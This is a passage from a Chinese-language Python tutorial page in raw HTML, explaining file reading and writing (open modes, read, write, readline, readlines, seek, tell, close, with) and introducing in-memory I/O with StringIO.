是一个非常好的语言。是的，的确非常好!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li>第一个参数为要打开的文件名。</li><li>第二个参数描述文件如何使用的字符。 mode 可以是 <code>r</code> 如果文件只读, <code>w</code> 只用于写 (如果存在同名文件则将被删除), 和 <code>a</code> 用于追加文件内容; 所写的任何数据都会被自动增加到末尾. <code>r+</code> 同时用于读写。 mode 参数是可选的; <code>r</code> 将是默认值。</li></ol></blockquote><br><br><h4 id="1-2-f-write"><font color="#3CB371" face="Comic sans MS">1.2 f.write()</font><a href="post/Python-FileContents#1-2-f-write"></a></h4><br><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">语法格式</th><th align="left">参数说明</th><th align="left">返回类型</th></tr></thead><tbody><tr><td align="left">f.write(string)</td><td align="left">将 string 写入到文件中</td><td align="left">返回写入的字符数</td></tr></tbody></table></div></div><br><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 打开一个文件</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"g:/pythonst/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"16845654316532"</span> <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭打开的文件</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT： <span class="token number">14</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="1-3-f-read"><font color="#3CB371" face="Comic sans MS">1.3 f.read()</font><a href="post/Python-FileContents#1-3-f-read"></a></h4><p>为了读取一个文件的内容，调用 <code>f.read(size)</code>, 这将读取一定数目的数据, 然后作为字符串或字节对象返回。</p><p>size 是一个可选的数字类型的参数。 当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回。</p><p><strong>注意：</strong><font color="#FF7F00"><strong><code>f.read(size)</code>必须在<code>r</code>或者<code>r+</code>模式下来读取内容。</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">语法格式</th><th align="left">参数说明</th><th align="left">返回类型</th></tr></thead><tbody><tr><td align="left">f.read(size)</td><td align="left">文件读取指定的字节数（读取的时候文件内容的<br>一个字符按一个字节来读），如果未给定或为负则读取所有</td><td align="left">字符串或字节对象返回</td></tr></tbody></table></div></div><br><p>以下实例假定文件 foo.txt 已存在（上面实例中已创建）：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">'''foo.txt文件内容为16845654316532'''</span><span class="token comment" spellcheck="true"># 打开一个文件</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"g:/PythonSt/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span>  m <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span>m<span class="token punctuation">,</span>int<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token keyword">is</span> str<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭打开的文件</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT：<span class="token number">168456</span>      <span class="token triple-quoted-string string">'''把一个字符当作一个字节读取'''</span><span class="token boolean">False</span>       <span class="token triple-quoted-string string">'''isinstance(变量,类型)判断变量的类型'''</span><span class="token boolean">True</span>        <span class="token triple-quoted-string string">'''type()...is 也可以判断类型'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="1-4-f-close"><font color="#3CB371" face="Comic sans MS">1.4 f.close()</font><a href="post/Python-FileContents#1-4-f-close"></a></h4><p>在文本文件中 (那些打开文件的模式下没有 b 的), 只会相对于文件起始位置进行定位。</p><p>当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，<font color="#FF7F00"><strong>如果尝试再调用该文件，则会抛出异常</strong></font>。如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 打开一个文件</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"g:/pythonst/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"16845654316532"</span> <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭打开的文件</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>OUTPUT： <span class="token number">14</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"3-7.py"</span><span class="token punctuation">,</span> line <span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ValueError<span class="token punctuation">:</span> I<span class="token operator">/</span>O operation on closed file<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用<font color="#FF7F00"><strong><code>try ... finally</code></strong></font>来实现：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">'''foo.txt内容为16845654316532'''</span><span class="token keyword">try</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"g:/PythonSt/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span>      m <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT： <span class="token number">168456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>但是每次都这么写实在太繁琐，所以，Python引入了<font color="#FF7F00"><strong><code>with</code>语句搭配<code>as</code></strong></font>来自动帮我们调用close()方法：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">'''foo.txt内容为16845654316532'''</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"g:/PythonSt/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>OUTPUT： <span class="token number">16845654316532</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="1-5-f-readline"><font color="#3CB371" face="Comic sans MS">1.5 f.readline()</font><a href="post/Python-FileContents#1-5-f-readline"></a></h4><br><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">语法格式</th><th align="left">参数说明</th><th align="left">返回类型</th></tr></thead><tbody><tr><td align="left">fileObject.readline(size)</td><td align="left">size为从文件中读取的字节数。<br>从文件读取整行，（包括 “\n” 字符。）</td><td align="left">size非负数则返回指定大小的字节数，<br>包括”\n”字符。</td></tr></tbody></table></div></div><br><p>实例<br>以下实例演示了 readline() 方法的使用：</p><p>文件 runoob.txt 的内容如下：</p><p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 打开文件</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"runoob.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"文件名为: "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>name<span class="token punctuation">)</span>line <span class="token operator">=</span> fo<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"读取第一行 %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span>line <span class="token operator">=</span> fo<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"读取的字符串为: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭文件</span>fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT<span class="token punctuation">:</span>文件名为<span class="token punctuation">:</span>  runoob<span class="token punctuation">.</span>txt读取第一行 www<span class="token punctuation">.</span>runoob<span class="token punctuation">.</span>com<span class="token string">'\n'</span>读取的字符串为<span class="token punctuation">:</span> www<span class="token punctuation">.</span>r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="1-6-f-readlines"><font color="#3CB371" face="Comic sans MS">1.6 f.readlines()</font><a href="post/Python-FileContents#1-6-f-readlines"></a></h4><p>概述<br>readlines() 方法用于读取所有行(直到结束符 EOF)并返回列表，该列表可以由 Python 的 for… in … 结构进行处理。 如果碰到结束符 EOF 则返回空字符串。</p><p>如果碰到结束符 EOF 则返回空字符串。<br>关于EOF可参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">文件结束符EOF</a>]</font> </p><br><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">语法格式</th><th align="left">参数说明</th><th align="left">返回类型</th></tr></thead><tbody><tr><td align="left">fileObject.readlines( )</td><td align="left">无参数</td><td align="left">返回列表，包含所有的行。</td></tr></tbody></table></div></div><br><p>实例<br>以下实例演示了 readline() 方法的使用：</p><p>文件 runoob.txt 的内容如下：</p><p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p><pre class="line-numbers language-python"><code class="language-python">请自行区分下面两种输出方式：（<span class="token number">1</span>）<span class="token comment" spellcheck="true"># 打开文件</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"runoob.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"文件名为: "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fo<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭文件</span>fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT：<span class="token punctuation">[</span><span class="token string">"www.runoob.com'\\n'\n"</span><span class="token punctuation">,</span> <span class="token string">'www.runoob.com\n'</span><span class="token punctuation">,</span> <span class="token string">'www.runoob.com\n'</span><span class="token punctuation">,</span> <span class="token string">'www.runoob.com\n'</span><span class="token punctuation">,</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>（<span class="token number">2</span>）<span class="token comment" spellcheck="true"># 打开文件</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"runoob.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"文件名为: "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> fo<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                          <span class="token comment" spellcheck="true">#依次读取每行  </span>    line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>                             <span class="token comment" spellcheck="true">#去掉每行头尾空白  </span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"读取的数据为: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭文件</span>fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT：文件名为<span class="token punctuation">:</span>  runoob<span class="token punctuation">.</span>txt读取的数据为<span class="token punctuation">:</span> www<span class="token punctuation">.</span>runoob<span class="token punctuation">.</span>com<span class="token string">'\n'</span>读取的数据为<span class="token punctuation">:</span> www<span class="token punctuation">.</span>runoob<span class="token punctuation">.</span>com读取的数据为<span class="token punctuation">:</span> www<span class="token punctuation">.</span>runoob<span class="token punctuation">.</span>com读取的数据为<span class="token punctuation">:</span> www<span class="token punctuation">.</span>runoob<span class="token punctuation">.</span>com读取的数据为<span class="token punctuation">:</span> www<span class="token punctuation">.</span>runoob<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="1-7-f-tell"><font color="#3CB371" face="Comic sans MS">1.7 f.tell()</font><a href="post/Python-FileContents#1-7-f-tell"></a></h4><p>f.tell() 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">语法格式</th><th align="left">参数说明</th><th align="left">返回类型</th></tr></thead><tbody><tr><td align="left">f.tell()</td><td align="left">无参数</td><td align="left">返回文件指针的当前位置（整数）</td></tr></tbody></table></div></div><br><p>实例<br>以下实例演示了 readline() 方法的使用：</p><p>文件 runoob.txt 的内容如下：</p><p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 打开文件</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"runoob.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"文件名为: "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>name<span class="token punctuation">)</span>line <span class="token operator">=</span> fo<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"读取的数据为: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取当前文件位置</span>pos <span class="token operator">=</span> fo<span class="token punctuation">.</span>tell<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"当前位置: %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭文件</span>fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT：文件名为<span class="token punctuation">:</span>  runoob<span class="token punctuation">.</span>txt读取的数据为<span class="token punctuation">:</span> www<span class="token punctuation">.</span>runoob<span class="token punctuation">.</span>com<span class="token string">'\n'</span>当前位置<span class="token punctuation">:</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="1-8-f-seek"><font color="#3CB371" face="Comic sans MS">1.8 f.seek()</font><a href="post/Python-FileContents#1-8-f-seek"></a></h4><p>如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数。</p><p>from_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾。from_what 值为默认为0，即文件开头。例如：</p><p>seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符<br>seek(x,1) ： 表示从当前位置往后移动x个字符<br>seek(-x,2)：表示从文件的结尾往前移动x个字符</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">语法格式</th><th align="left">参数说明</th><th align="left">返回类型</th></tr></thead><tbody><tr><td align="left">f.seek(offset[, whence])</td><td align="left">offset： 开始的偏移量，也就是代表需要移动偏移的字节数，<br>如果是负数表示从倒数第几位开始。<br>whence：可选，默认值为 0。给 offset 定义一个参数，<br>表示要从哪个位置开始偏移；0 代表从文件开头开始算起，<br>1 代表从当前位置开始算起，2 代表从文件末尾算起。</td><td align="left">无返回值</td></tr></tbody></table></div></div><br><p>实例<br>以下实例演示了 readline() 方法的使用：</p><p>文件 runoob.txt 的内容如下：</p><p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 打开文件</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"runoob.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"文件名为: "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>name<span class="token punctuation">)</span>line <span class="token operator">=</span> fo<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"读取的数据为: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 重新设置文件读取指针到开头</span>fo<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>line <span class="token operator">=</span> fo<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"读取的数据为: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭文件</span>fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT：文件名为<span class="token punctuation">:</span>  runoob<span class="token punctuation">.</span>txt读取的数据为<span class="token punctuation">:</span> www<span class="token punctuation">.</span>runoob<span class="token punctuation">.</span>com<span class="token string">'\n'</span>读取的数据为<span class="token punctuation">:</span> www<span class="token punctuation">.</span>runoob<span class="token punctuation">.</span>com<span class="token string">'\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="1-9-file-对象的方法"><font color="#3CB371" face="Comic sans MS">1.9 file 对象的方法</font><a href="post/Python-FileContents#1-9-file-对象的方法"></a></h4><br><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.close()</a></font><br>关闭文件。关闭后文件不能再进行读写操作。</td></tr><tr><td align="left">2</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.flush()</a></font> <br>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件,<br>而不是被动的等待输出缓冲区写入。</td></tr><tr><td align="left">3</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.fileno()</a></font> <br>返回一个整型的文件描述符(file descriptor FD 整型), <br>可以用在如os模块的read方法等一些底层操作上。</td></tr><tr><td align="left">4</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.isatty()</a></font><br>如果文件连接到一个终端设备返回 True，否则返回 False。</td></tr><tr><td align="left">5</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.next()</a></font> <br>返回文件下一行。</td></tr><tr><td align="left">6</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.read([size])</a></font> <br>从文件读取指定的字节数，如果未给定或为负则读取所有。</td></tr><tr><td align="left">7</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.readline([size])</a></font> <br>读取整行，包括 “\n” 字符。</td></tr><tr><td align="left">8</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.readlines([sizeint])</a></font><br> 读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, <br>实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。</td></tr><tr><td align="left">9</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.seek(offset[, whence])</a></font> <br>设置文件当前位置</td></tr><tr><td align="left">10</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.tell()</a></font> <br>返回文件当前位置。</td></tr><tr><td align="left">11</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.truncate([size])</a></font> <br>从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；<br>截断之后后面的所有字符被删除，其中 Widnows 系统下的换行代表2个字符大小。</td></tr><tr><td align="left">12</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.write(str)</a></font> <br>将字符串写入文件，返回的是写入的字符长度。</td></tr><tr><td align="left">13</td><td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703" target="_blank" rel="noopener">file.writelines(sequence)</a></font> <br>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td></tr></tbody></table></div></div><br><br><h3 id="二-在内存读写"><font color="#FF6347" face="Comic sans MS">二. 在内存读写</font><a href="post/Python-FileContents#二-在内存读写"></a></h3><p>可参考：<br><font color="#00B2EE">[<a href="https://blog.51cto.com/limingyu/2320441?source=dra" target="_blank" rel="noopener">StringIO和BytesIO</a>]</font><br><font color="#00B2EE">[<a href="https://www.jianshu.com/p/b74a83e0f9fc" target="_blank" rel="noopener">Python文件读写、StringIO和BytesIO</a>]</font></p><br><p>IO在计算机中指Input/Output，也就是输入和输出。由于程序和运行时数据是在内存中驻留，由CPU这个超快的计算核心来执行，涉及到数据交换的地方，通常是磁盘、网络等，就需要IO接口。</p><p>由于CPU和内存的速度远远高于外设的速度，所以，在IO编程中，就存在速度严重不匹配的问题。举个例子来说，比如要把100M的数据写入磁盘，CPU输出100M的数据只需要0.01秒，可是磁盘要接收这100M数据可能需要10秒，怎么办呢？有两种办法：</p><p>第一种是CPU等着，也就是程序暂停执行后续代码，等100M的数据在10秒后写入磁盘，再接着往下执行，这种模式称为同步IO；</p><p>另一种方法是CPU不等待，只是告诉磁盘，“您老慢慢写，不着急，我接着干别的事去了”，于是，后续代码可以立刻接着执行，这种模式称为异步IO。</p><p>很明显，使用异步IO来编写程序性能会远远高于同步IO，但是异步IO的缺点是编程模型复杂。</p><p>操作IO的能力都是由操作系统提供的，每一种编程语言都会把操作系统提供的低级C接口封装起来方便使用，Python也不例外。我们后面会详细讨论Python的IO编程接口。</p><p>注意，本章的IO编程都是同步模式，异步IO由于复杂度太高，后续涉及到服务器端程序开发时我们再讨论。</p><br><p>就单独说一下Python的input()和print()：</p><p><strong>input()：</strong> 在控制台把数据输入到内存中，然后从内存中把数据以字符串形式返回给调用处；</p><p><strong>print()：</strong> 从内存中输出括号里的相对应的信息。</p><br><h4 id="2-1-StringIO"><font color="#3CB371" face="Comic sans MS">2.1 StringIO</font><a href="post/Python-FileContents#2-1-StringIO"></a></h4><p>很多时候，数据读写不一定是文件，也可以在<font color="#FF7F00"><strong>内存中</strong></font>读写。</p><p>StringIO是IO模块中的类，所以使用的时候要引用模块： <code>from io import StringIO</code></p><p>StringIO顾名思义就是<font color="#FF7F00"><strong>在内存中读写str</strong></font>。</p><ul><li><p>内存中，开辟的一个文本模式的buffer,可以像文件对象一样操作它；</p></li><li><p>当使用close()前写入的数据是<font color="#FF7F00"><strong>使用追加模式</strong></font>；</p></li><li><p>当close方法被调用的时候，这个buffer会被释放；</p></li></ul><p><strong>好处：</strong></p><p>  一般来说，磁盘的操作比内存的操作要慢得多；内存足够的情况下，一般的优化思路是少落地，减少磁盘IO的过程，可以大大提高程序的运行效率。</p><blockquote><p><strong>使用到的方法：</strong></p><ul><li><font color="#FF7F00"><strong>StringIO()：</strong></font>创建一个StringIO对象，类似文件的<code>open()</code>方法，创建的这个对象要赋值给一个变量；</li><li><font color="#FF7F00"><strong>f.write(‘String’)：</strong></font>将字符String写入到内存，返回写入的字节数（一个字符按一个字节算）；</li><li><font color="#FF7F00"><strong>f.getvalue(size)：</strong></font>从内存中读取size个字节（一个字符按一个字节算），若无参数则读取全部字节；</li><li><font color="#FF7F00"><strong>f.readable()：</strong></font>判断IO是否可读；</li><li><font color="#FF7F00"><strong>f.writable()：</strong></font>判断IO是否可写；</li><li><font 